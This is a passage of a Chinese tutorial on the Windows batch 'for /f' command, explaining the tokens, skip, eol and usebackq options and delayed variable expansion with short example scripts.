<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">尺有所短，寸有所长，学好批处理没商量，考虑问题复杂化，解决问题简洁化。</span><br></pre></td></tr></table></figure>

<p>对[txt2]这段文本，假设它们保存在文件test.txt中，如果我想提取“学好批处理没商量”这句话，该如何写代码呢？</p>
<p>我们稍微观察一下[txt2]就会发现，如果以逗号作为切分符号，就正好可以把“学好批处理没商量”化为单独的一“节”，结合上一节的讲解，我们知道，”delims=，” 这个开关是不可缺少的，而要提取的内容在以逗号切分的第3节上，那么，tokens= 后面的数字就应该是3了，最终的代码如下：<br>[code8]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f "delims=， tokens=<span class="number">3</span>" <span class="variable">%%i</span> <span class="keyword">in</span> (test.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>如果我们现在要提取的不只一个“节”，而是多个，那又怎么办呢？比如，要提取以逗号切分的第2节和第5节字符串，是写成这样吗？<br>[code9]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f "delims=， tokens=<span class="number">2</span>,<span class="number">5</span>" <span class="variable">%%i</span> <span class="keyword">in</span> (test.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>运行批处理后发现，执行结果只显示了第2节的内容。</p>
<p>原来，echo 后面的 %%i 只接收到了 tokens=2,5 中第一个数值2所代表的那个字符串，而第二个数值5所代表的字符串因为没有变量来接收，所以就无法在执行结果中显示出来了。</p>
<p>那么，要如何接收 tokens= 后面多个数值所指代的内容呢？</p>
<p>for /f 语句对这种情况做如下规定：</p>
<p>如果 tokens= 后面指定了多个数字，如果形式变量为%%i，那么，第一个数字指代的内容用第一个形式变量%%i来接收，第二个数字指代的内容用第二个形式变量%%j来接收，第三个数字指代的内容用第三个形式变量%%k来接收……第N个数字指代的内容用第N个形式变量来接收，其中，形式变量遵循字母的排序，第N个形式变量具体是什么符号，由第一个形式变量来决定：如果第一个形式变量是%%i，那么，第二个形式变量就是%%j；如果第一个形式变量用的是%%x，那么，第二个 形式变量就是%%y。</p>
<p>现在回头去看[code9]，你应该知道如何修改才能满足题目的要求了吧？修改结果如下：<br>[code10]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f "delims=， tokens=<span class="number">2</span>,<span class="number">5</span>" <span class="variable">%%i</span> <span class="keyword">in</span> (test.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span> <span class="variable">%%j</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>如果有这样一个要求：显示[txt2]中的内容，但是逗号要替换成空格，如何编写代码？</p>
<p>结合上面所学的内容，稍加思索，你可能很快就得出了答案：<br>[code11]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f "delims=， tokens=<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>" <span class="variable">%%i</span> <span class="keyword">in</span> (test.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span> <span class="variable">%%j</span> <span class="variable">%%k</span> <span class="variable">%%l</span> <span class="variable">%%m</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>写完之后，你可能意识到这样一个问题：假如要提取的“节”数不是5，而是10，或者20，或者更多，难道我也得从1写到10、20或者更多吗？有没有更简洁的写法呢？</p>
<p>答案是有的，那就是：如果要提取的内容是连续的多“节”的话，那么，连续的数字可以只写最小值和最大值，中间用短横连接起来即可，比如 tokens=1,2,3,4,5 可以简写为 tokens=1-5 。</p>
<p>还可以把这个表达式写得更复杂一点：tokens=1,2-5，tokens=1-3,4,5，tokens=1-4,5……怎么方便就怎么写吧。</p>
<p>大家可能还看到一种比较怪异的写法：<br>[code12]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f "delims=， tokens=<span class="number">1</span>,*" <span class="variable">%%i</span> <span class="keyword">in</span> (test.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span> <span class="variable">%%j</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>结果，第一个逗号不见了，取代它的是一个空格符号，其余部分保持不变。</p>
<p>其中奥妙就在这个星号上面。</p>
<p>tokens=后面所接的星号具备这样的功能：字符串从左往右被切分成紧跟在<em>之前的数值所表示的节数之后，字符串的其余部分保持不变，整体被</em>所表示的一个变量接收。</p>
<p>理论讲解是比较枯燥的，特别是为了严密起见，还使用了很多限定性的修饰词，导致句子很长，增加了理解的难度，我们还是结合[code12]来讲解一下吧。</p>
<p>[txt2] 的内容被切分，切分符号为逗号，当切分完第一节之后，切分动作不再继续下去，因为 tokens=1,* 中，星号前面紧跟的是数字1；第一节字符串被切分完之后，其余部分字符串不做任何切分，整体作为第二节字符串，这样，[txt2]就被切分成了两节，分别 被变量%%i和变量%%j接收。</p>
<p>以上几种切分方式可以结合在一起使用。不知道下面这段代码的含义你是否看得懂，如果看不懂的话，那就运行一下代码，然后反复揣摩，你一定会更加深刻地理解本节所讲解的内容的：<br>[code13]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f "delims=， tokens=<span class="number">1</span>,<span class="number">3</span>-<span class="number">4</span>,*" <span class="variable">%%i</span> <span class="keyword">in</span> (test.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span> <span class="variable">%%j</span> <span class="variable">%%k</span> <span class="variable">%%l</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>



<h4 id="跳过无关内容，直奔主题：skip-n"><a href="#跳过无关内容，直奔主题：skip-n" class="headerlink" title="** 跳过无关内容，直奔主题：skip=n**"></a>** 跳过无关内容，直奔主题：skip=n**</h4><p>很多时候，有用的信息并不是贯穿文本内容的始终，而是位于第N行之后的行内，为了提高文本处理的效率，或者不受多余信息的干扰，for /f 允许你跳过这些无用的行，直接从第N+1行开始处理，这个时候，就需要使用参数 skip=n，其中，n是一个正整数，表示要跳过的行数。例如：<br>[code14]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f "skip=<span class="number">2</span>" <span class="variable">%%i</span> <span class="keyword">in</span> (test.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>这段代码将跳过头两行内容，从第3行起显示test.txt中的信息。</p>
<h4 id="忽略以指定字符打头的行：eol"><a href="#忽略以指定字符打头的行：eol" class="headerlink" title="忽略以指定字符打头的行：eol="></a><strong>忽略以指定字符打头的行：eol=</strong></h4><p> 在cmd窗口中敲入：for /?，相关的解释为：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">eol=c    -指一个行注释字符的结尾(就一个)</span><br><span class="line"><span class="keyword">FOR</span> /F "eol=; tokens=<span class="number">2</span>,<span class="number">3</span>* delims=, " %i <span class="keyword">in</span> (myfile.txt) <span class="keyword">do</span> @<span class="built_in">echo</span> %i %j %k</span><br><span class="line">会分析 myfile.txt 中的每一行，忽略以分号打头的那些行……</span><br></pre></td></tr></table></figure>

<p>第一条解释狗屁不通，颇为费解：行注释字符的结尾是什么意思？“(就一个)”怎么回事？结合第二条解释，才知道eol有忽略指定行的功能。但是，这两条解释是互相矛盾的：到底是忽略以指定字符打头的行，还是忽略以指定字符结尾的行？</p>
<p>实践是检验真理的唯一标准，还是用代码来检验一下eol的作用吧：<br>[code15]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f "eol=;" <span class="variable">%%i</span> <span class="keyword">in</span> (test.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>结果，那些以分号打头的行没有显示出来。</p>
<p>由此可见，第二条解释是正确的，eol= 的准确含义是：忽略以指定字符打头的行。而第一条的“结尾”纯属微软在信口开河。</p>
<p>那么，“(就一个)”又作何解释呢？</p>
<p>试试这个代码：<br>[code16]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f "eol=,;" <span class="variable">%%i</span> <span class="keyword">in</span> (test.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>此时，屏幕上出现“此时不应有” ;”。”的报错信息。可见，在指定字符的时候，只能指定1个——在很多时候，我对这样的设计颇有微词而又无可奈何：为什么只能指定1个而不是多个？要忽略多个还得又是if又是findstr加管道来多次过滤，那效率实在太低下了——能用到的功能基本上都提供，但是却又做不到更好，批处理，你的功能为什么那么弱？</p>
<p>不知道大家注意到没有，如果test.txt中有以分号打头的行，那么，这些行在代码[code14]的执行结果中将凭空消失。</p>
<p>原来，for /f 语句是默认忽略以分号打头的行内容的，正如它默认以空格键或跳格键作为字符串的切分字符一样。（注：eol=;这种默认设置，在delims=;时变得无效。）</p>
<p>很多时候，我们可以充分利用这个特点，比如，在设计即将用for读取的配置文件的时候，可以在注释文字的行首加上分号，例如在编写病毒文件查杀代码的时候，可以通过for语句来读取病毒文件列表，那么，病毒文件列表.ini这个配置文件可以这样写：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">;以下是常见的病毒文件，请见一个杀一个</span><br><span class="line">;copyleft:没有</span><br><span class="line">qq.exe</span><br><span class="line">msn.exe</span><br><span class="line">iexplore.exe</span><br></pre></td></tr></table></figure>

<p>如果要取消这个默认设置，可选择的办法是：<br>  1、为eol=指定另外一个字符；<br>  2、使用 for /f “eol=” 语句，也就是说，强制指定字符为空，就像对付delims=一样。</p>
<h4 id="如何决定该使用-for-f-的哪种句式？（兼谈usebackq的使用）"><a href="#如何决定该使用-for-f-的哪种句式？（兼谈usebackq的使用）" class="headerlink" title="如何决定该使用 for /f 的哪种句式？（兼谈usebackq的使用）"></a><strong>如何决定该使用 for /f 的哪种句式？（兼谈usebackq的使用）</strong></h4><p>for /f %%i in (……) do (……) 语句有好几种变形语句，不同之处在于第一个括号里的内容：有的是用单引号括起来，有的是用双引号包住，有的不用任何符号包裹，具体格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、for /f %%i in (文件名) do (……)</span><br><span class="line">2、for /f %%i in (&apos;命令语句&apos;) do (……)</span><br><span class="line">3、for /f %%i in (&quot;字符串&quot;) do (……)</span><br></pre></td></tr></table></figure>

<p>看到这里，我想很多人可能已经开始犯了迷糊了：如果要解决一个具体问题，面对这么多的选择，如何决定该使用哪一条呢？</p>
<p>实际上，当我在上面罗列这些语句的时候，已经有所提示了，不知道你是否注意到了。</p>
<p>如果你一时无法参透其中奥妙，那也无妨，请听我一一道来便是。</p>
<p>​    1、当你希望读取文本文件中的内容的话，第一个括号中不用任何符号包裹，应该使用的是第1条语句；例如：你想显示test.txt中的内容，那么，就使用 for /f %%i in (test.txt) do echo %%i；<br>　 2、当你读取的是命令语句执行结果中的内容的话，第一个括号中的命令语句必须使用单引号包裹，应该使用的是第2条语句；例如：你想显示当前目录下文件名中含有test字符串的文本文件的时候，应该使用 for /f %%i in (‘dir /a-d /b <em>test</em>.txt’) do echo %%i 这样的语句；<br>　 3、当你要处理的是一个字符串的时候，第一个括号中的内容必须用双引号括起来，应该是用的是第3条语句；例如：当你想把bbs.bathome.net这串字符中的点号换为短横线并显示出来的话，可以使用 for /f “delims=. tokens=1-3” %%i in (“bbs.bathome.net”) do echo %%i-%%j-%%k 这样的语句。</p>
<p>很显然，第一个括号里是否需要用符号包裹起来，以及使用什么样的符号包裹，取决于要处理的对象属于什么类型：如果是文件，则无需包裹；如果是命令语句，则用单引号包裹；如果是字符串，则使用双引号括起来。</p>
<p>当然，事情并不是绝对如此，如果细心的你想到了批处理中难缠的特殊字符，你肯定会头大如斗。</p>
<p>或许你头脑中灵光一闪，已经想到了一个十分头痛的问题：在第1条语句中，如果文件名中含有空格或&amp;，该怎么办？</p>
<p>照旧吗？</p>
<p>拿个叫 test 1.txt 的文件来试试。</p>
<p>你很快写好了代码，新建文件–&gt;码字–&gt;保存为批处理，前后费时不到1分钟：<br>[code17]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (test <span class="number">1</span>.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>你兴冲冲地双击批处理，运行后，屏幕上出现了可耻的报错信息：系统找不到文件 test 。</p>
<p>当你把 test 1.txt 换成 test&amp;1.txt 后，更怪异的事情发生了：CMD窗口在你眼前一闪而过，然后，优雅地消失了。</p>
<p>你可能觉得自己的代码写错了某些符号，你再仔细的检查了一次，确认没有笔误，然后，你再次双击批处理，结果问题照旧；你开始怀疑其他程序对它可能有影响，于是关掉其他窗口，再运行了一次，问题依旧；你不服气地连续运行了好几次，还是同样的结果。</p>
<p>怪哉！</p>
<p>你一拍大腿，猛然想起了一件事：当路径中含有特殊字符的时候，应该使用引号把路径括起来。对，就是它了！</p>
<p>但是，当你把代码写出来之后，你很快就焉了：for /f %%i in (“test 1.txt”) do echo %%i，这不就是上面提到的第3条 for /f 命令的格式吗？批处理会把 test 1.txt 这个文件名识别为字符串啊！</p>
<p>你百无聊赖地在CMD窗口中输入 for /? ，并重重地敲下了回车，漫无目的地在帮助信息中寻找，希望能找到点什么。</p>
<p>结果还真让你到了点什么。</p>
<p>你看到了这样的描述：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usebackq     - 指定新语法已在下类情况中使用:</span><br><span class="line">               在作为命令执行一个后引号的字符串并且一个单引号字符为文字字符串命令并允许在 filenameset 中使用双引号扩起文件名称。</span><br></pre></td></tr></table></figure>

<p>但是，通读一遍之后，你却如坠五里雾中，不知所云。</p>
<p>还好，下面有个例子，并配有简单的说明：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR /F &quot;usebackq delims==&quot; %i IN (`set`) DO @echo %i</span><br><span class="line">会枚举当前环境中的环境变量名称。</span><br></pre></td></tr></table></figure>

<p>你仔细对比了for /f语句使用usebackq和不使用usebackq时在写法上的差别，很快就找到了答案：当使用了usebackq之后，如果第一个括号中是一条命令语句，那么，就要把单引号’改成后引号`（键盘左上角esc键下面的那个按键，与~在同一键位上）。</p>
<p>回过头去再看那段关于usebackq的描述，字斟句酌，反复揣摩，终于被你破译了天机：usebackq 是一个增强型参数，当使用了这个参数之后，原来的for语句中第一个括号内的写法要做如下变动：如果第一个括号里的对象是一条命令语句的话，原来的单引号’要改为后引号`；如果第一个括号里的对象是字符串的话，原来的双引号”要改为单引号’；如果第一个括号里的对象是文件名的话，要用双引号”括起来。</p>
<p>验证一下，把[code17]改写成如下代码：<br>[code18]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f "usebackq" <span class="variable">%%i</span> <span class="keyword">in</span> ("test <span class="number">1</span>.txt") <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>测试通过！</p>
<p>此时，你很可能会仰天长叹：Shit，微软这该死的机器翻译！</p>
<p>至于把[code17]代码中的空格换成&amp;后，CMD窗口会直接退出，那是因为&amp;是复合语句的连接符，CMD在预处理的时候，会优先把&amp;前后两部分作为两条语句来解析，而不是大家想象中的一条完整的for语句，从而产生了严重的语法错误。因为牵涉到预处理机制问题，不属于本节要讨论的内容，在此不做详细讲解。</p>
<p>这个时候，我们会吃惊地发现，区区一条for语句，竟然有多达6种句型：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、for /f %%i in (文件名) do (……)</span><br><span class="line">2、for /f %%i in (&apos;命令语句&apos;) do (……)</span><br><span class="line">3、for /f %%i in (&quot;字符串&quot;) do (……)</span><br><span class="line">4、for /f &quot;usebackq&quot; %%i in (&quot;文件名&quot;) do (……)</span><br><span class="line">5、for /f &quot;usebackq&quot; %%i in (`命令语句`) do (……)</span><br><span class="line">6、for /f &quot;usebackq&quot; %%i in (&apos;字符串&apos;) do (……)</span><br></pre></td></tr></table></figure>

<p>其中，4、5、6由1、2、3发展而来，他们有这样的对应关系：1–&gt;4、2–&gt;5、3–&gt;6。</p>
<p>好在后3种情形并不常用，所以，牢牢掌握好前三种句型的适用情形就可以了，否则，要在这么多句型中确定选择哪一条语句来使用，还真有点让人头脑发懵。</p>
<p>至于 for /f 为什么要增加usebacq参数，我只为第4条语句找到了合理的解释：为了兼容文件名中所带的空格或&amp;。它在第5、6条语句中为什么还有存在的必要，我也不是很明白，这有待于各位去慢慢发现。（注：这种解释虽然有点不靠谱，但也算一种解释，大家将就看看吧。启用usebackq选项的时候，“文件名”取代了“字符串”，那么“字符串”只好改变为“命令语句”，“命令语句”只好用后引号重新表示——简而言之，是“文件名”符号改变引起的蝴蝶效应。言外之意：usebackq除了在处理带空格的文件名时会用到外，根本就没有其它的出场机会和存在价值。）</p>
<h4 id="变量延迟详解"><a href="#变量延迟详解" class="headerlink" title="变量延迟详解"></a><strong>变量延迟详解</strong></h4><p>变量延迟在for语句中起着至关重要的作用，不只是在for语句中，在其他的复合语句中，它也在幕后默默地工作着，为了突出它的重要性，本节内容在单独的楼层中发出来，希望引起大家的重视。</p>
<p>对于批处理新手而言，“变量延迟”这个概念很可能闻所未闻，但是，它却像一堵横亘在你前进道路上的无形高墙，你感受不到它的存在，但当你试图往前冲时，它会把你狠狠地弹回来，让你无法逾越、无功而返；而一旦找到了越过它的方法，你就会发现，在for的世界里，前面已经是一片坦途，而你对批处理的理解，又上升到了一个新的境界。</p>
<p>例如，你编写了这样一个代码：<br>[code19]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">set</span> num=<span class="number">0</span>&amp;&amp;<span class="built_in">echo</span> <span class="variable">%num%</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>你的本意是想对变量num赋值之后，再把这个值显示出来，结果，显示出来的并不是0，而是显示：ECHO 处于关闭状态。</p>
<p>之所以会出错，是因为“变量延迟”这个家伙在作怪。</p>
<p>在讲解变量延迟之前，我们需要了解一下批处理的执行过程，它将有助于我们深入理解变量延迟。</p>
<p>批处理的执行过程是怎样的呢？</p>
<p>“自上而下，逐条执行”，我想，这个经典的说法大家都已经耳熟能详了，没事的时候倒着念，也还别有一番古韵呢，但是，我想问大家的是，大家真的深刻地理解了这句话的含义了吗？</p>
<p>“自上而下”，这一条和我们本节的讲解关系不大，暂时略过不说，后一条，“逐条执行”和变量延迟有着莫大的干系，它是我们本节要关注的重点。</p>
<p>很多人往往认为一行代码就是一条语句，从而把“逐条执行”与“逐行执行”等同起来，这就大错特错了。</p>
<p>莫非“逐条执行”里暗藏着玄机？</p>
<p>正是如此。</p>
<p>“逐条”并不等同于“逐行”。这个“条”，是“一条完整的语句”的意思，并不是指“一行代码”。在批处理中，是不是一条完整的语句，并不是以行来论的，而是要看它的作用范围。</p>
<p>什么样的语句才算“一条完整的语句”呢？<br>  1、在复合语句中，整个复合语句是一条完整的语句，而无论这个复合语句占用了多少行的位置。常见的复合语句有：for语句、if……else语句、用 连接符&amp;、||和&amp;&amp;连接的语句，用管道符号|连接的语句，以及用括号括起来的、由多条语句组合而成的语句块；<br>  2、在非复合语句中，如果该语句占据了一行的位置，则该行代码为一条完整的语句。<br>例如：<br>[code20]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"> <span class="number">1</span> @<span class="built_in">echo</span> off</span><br><span class="line"> <span class="number">2</span> <span class="built_in">set</span> num=<span class="number">0</span></span><br><span class="line"> <span class="number">3</span> <span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> ('<span class="built_in">dir</span> /a-d /b *.exe') <span class="keyword">do</span> (</span><br><span class="line"> <span class="number">4</span>     <span class="built_in">set</span> /a num+=<span class="number">1</span></span><br><span class="line"> <span class="number">5</span>     <span class="built_in">echo</span> num 当前的值是 <span class="variable">%num%</span></span><br><span class="line"> <span class="number">6</span> )</span><br><span class="line"> <span class="number">7</span> <span class="built_in">echo</span> 当前目录下共有 <span class="variable">%num%</span> 个exe文件</span><br><span class="line"> <span class="number">8</span> <span class="built_in">dir</span> /a-d /b *.txt|<span class="built_in">findstr</span> "test"&gt;<span class="built_in">nul</span>&amp;&amp;(</span><br><span class="line"> <span class="number">9</span>     <span class="built_in">echo</span> 存在含有 test 字符串的文本本件</span><br><span class="line"><span class="number">10</span> ) || <span class="built_in">echo</span> 不存在含有 test 字符串的文本文件</span><br><span class="line"><span class="number">11</span> <span class="keyword">if</span> <span class="keyword">exist</span> test.ini (</span><br><span class="line"><span class="number">12</span>     <span class="built_in">echo</span> 存在 test.ini 文件</span><br><span class="line"><span class="number">13</span> ) <span class="keyword">else</span> <span class="built_in">echo</span> 不存在 test.ini 文件</span><br><span class="line"><span class="number">14</span> <span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>上面的代码共有14行，但是只有完整的语句只有7条，它们分别是：<br>　　第1条：第1行的echo语句；<br>　　第2条：第2行的set语句；<br>　　第3条：第3、4、5、6行上的for复合语句；<br>　　第4条：第7行的echo语句；<br>　　第5条：第8、9、10行上用&amp;&amp;和||连接的复合语句；<br>　　第6条：第11、12、13行上的if……else复合语句；<br>　　第7条：第14行上的pause语句。</p>
<p>在这里，我之所以要花这么长的篇幅来说明一行代码并不见得就是一条语句，是因为批处理的执行特点是“逐条”执行而不是“逐行”执行，澄清了这个误解，将会更加理解批处理的预处理机制。</p>
<p>在代码“逐条”执行的过程中，cmd.exe这个批处理解释器会对每条语句做一些预处理工作，这就是批处理中大名鼎鼎的“预处理机制”。</p>
<p>预处理的大致情形是这样的：首先，把一条完整的语句读入内存中（不管这条语句有多少行，它们都会被一起读入），然后，识别出哪些部分是命令关键字，哪些是开关、哪些是参数，哪些是变量引用……如果代码语法有误，则给出错误提示或退出批处理环境；如果顺利通过，接下来，就把该条语句中所有被引用的变量及变量两边的百分号对，用这条语句被读入内存之就已经赋予该变量的具体值来替换……当所有的预处理工作完成之后，批处理才会执行每条完整语句内部每个命令的原有功能。也就是说，如果命令语句中含有变量引用（变量及紧邻它左右的百分号对），并且某个变量的值在命令的执行过程中被改变了，即使该条语句内部的其他地方也用到了这个变量，也不会用最新的值去替换它们，因为某条语句在被预处理的时候，所有的变量引用都已经被替换成字符串常量了，变量值在复合语句内部被改变，不会影响到语句内部的其他任何地方。</p>
<p>顺便说一下，运行代码[code20]之后，将在屏幕上显示当前目录下有多少个exe文件，是否存在含有 test 字符串的文本文件，以及是否存在 test.ini 这个文件等信息。让很多人百思不得其解的是：如果当前目录下存在exe文件，那么，有多少个exe文件，屏幕上就会提示多少次 “num 当前的值是 0” ，而不是显示1到N（N是exe文件的个数）。</p>
<p>结合上面两个例子，我们再来分析一下，为什么这两段代码的执行结果和我们的期望有一些差距。</p>
<p>在[code19]中，set num=0&amp;&amp;echo %num%是一条复合语句，它的含义是：把0赋予变量num，成功后，显示变量num的值。</p>
<p>虽然是在变量num被赋值成功后才显示变量num的值，但是，因为这是一条复合语句，在预处理的时候，&amp;&amp;后的%num%只能被set语句之前的语句赋予变量num的具体值来替换，而不能被复合语句内部、&amp;&amp;之前的set语句对num所赋予的值来替换，可见，此num非彼num。可是，在这条复合语句之前，我们并没有对变量num赋值，所以，&amp;&amp;之后的%num%是空值，相当于在&amp;&amp;之后只执行了 echo 这一命令，所以，会显示 echo 命令的当前状态，而不是显示变量num的值（虽然该变量的值被set语句改变了）。</p>
<p>在[code20]中，for语句的含义是：列举当前目录下的exe文件，每发现一个exe文件，变量num的值就累加1，并显示变量num的值。</p>
<p>看了对[code19]的分析之后，再来分析[code20]就不再那么困难了：第3、4、5行上的代码共同构成了一条完整的for语句，而语句”echo num 当前的值是 %num%”与”set /a num+=1”同处复合语句for的内部，那么，第4行上set改变了num的值之后，并不能对第5行上的变量num有任何影响，因为在预处理阶段，第5行上的变量引用%num%已经被在for之前就赋予变量num的具体值替换掉了，它被替换成了0（是被第2行上的set语句赋予的）。</p>
<p>如果想让代码[code19]的执行结果中显示&amp;&amp;之前赋予num的值，让代码[code20]在列举exe文件的时候，从1到N地显示exe文件的数量，那又该怎么办呢？</p>
<p>对代码[code19]，可以把用&amp;&amp;连接复合语句拆分为两条单独的语句，写成：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">set</span> num=<span class="number">0</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%num%</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>但是，这不是我们这次想要的结果。</p>
<p>对这两段代码都适用的办法是：使用变量延迟扩展语句，让变量的扩展行为延迟一下，从而获取我们想要的值。</p>
<p>在这里，我们先来充下电，看看“变量扩展”有是怎么一回事。</p>
<p>用CN-DOS里批处理达人willsort的原话，那就是：“在许多可见的官方文档中，均将使用一对百分号闭合环境变量以完成对其值的替换行为称之为“扩展（expansion）”，这其实是一个第一方的概念，是从命令解释器的角度进行称谓的，而从我们使用者的角度来看，则可以将它看作是引用（Reference）、调用（Call）或者获取（Get）。”（见：什么情况下该使用变量延迟？<a href="http://www.cn-dos.net/forum/viewthread.php?tid=20733）说得直白一点，所谓的“变量扩展”，实际上就是很简单的这么一件事情：用具体的值去替换被引用的变量及紧贴在它左右的那对百分号。" target="_blank" rel="noopener">http://www.cn-dos.net/forum/viewthread.php?tid=20733）说得直白一点，所谓的“变量扩展”，实际上就是很简单的这么一件事情：用具体的值去替换被引用的变量及紧贴在它左右的那对百分号。</a></p>
<p>既然只要延迟变量的扩展行为，就可以获得我们想要的结果，那么，具体的做法又是怎样的呢？</p>
<p>一般说来，延迟变量的扩展行为，可以有如下选择：<br>  1、在适当位置使用 setlocal enabledelayedexpansion 语句；<br>  2、在适当的位置使用 call 语句。</p>
<p>使用 setlocal enabledelayedexpansion 语句，那么，[code19]和[code20]可以分别修改为：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"><span class="built_in">set</span> num=<span class="number">0</span>&amp;&amp;<span class="built_in">echo</span> <span class="variable">!num!</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">set</span> num=<span class="number">0</span></span><br><span class="line"><span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> ('<span class="built_in">dir</span> /a-d /b *.exe') <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> /a num+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">echo</span> num 当前的值是 <span class="variable">!num!</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> 当前目录下共有 <span class="variable">%num%</span> 个exe文件</span><br><span class="line"><span class="built_in">dir</span> /a-d /b *.txt|<span class="built_in">findstr</span> "test"&gt;<span class="built_in">nul</span>&amp;&amp;(</span><br><span class="line">    <span class="built_in">echo</span> 存在含有 test 字符串的文本本件</span><br><span class="line">)||<span class="built_in">echo</span> 不存在含有 test 字符串的文本文件</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">exist</span> test.ini (</span><br><span class="line">    <span class="built_in">echo</span> 存在 test.ini 文件</span><br><span class="line">) <span class="keyword">else</span> <span class="built_in">echo</span> 不存在 test.ini 文件</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>使用第call语句，那么，[code19]和[code20]可以分别修改为：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">set</span> num=<span class="number">0</span>&amp;&amp;<span class="keyword">call</span> <span class="built_in">echo</span> <span class="variable">%%n</span>um%%</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

